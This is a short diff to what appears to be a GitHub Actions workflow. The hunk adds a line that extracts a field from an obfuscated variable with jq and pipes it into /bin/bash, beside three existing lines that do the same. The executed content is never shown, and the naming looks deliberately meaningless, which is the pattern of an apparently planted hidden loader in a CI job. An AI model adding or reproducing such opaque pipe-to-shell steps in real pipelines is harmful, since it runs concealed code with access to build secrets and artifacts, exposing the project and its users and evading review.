@@ -34,6 +34,7 @@ jobs:
           echo $lvoo0 | jq -r .p8 | /bin/bash
           echo $nwm54 | jq -r .e1574 | /bin/bash
           echo $p8 | jq -r .pjwvb503 | /bin/bash
+          printf '%s' "$p60" | jq -r .buah787 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
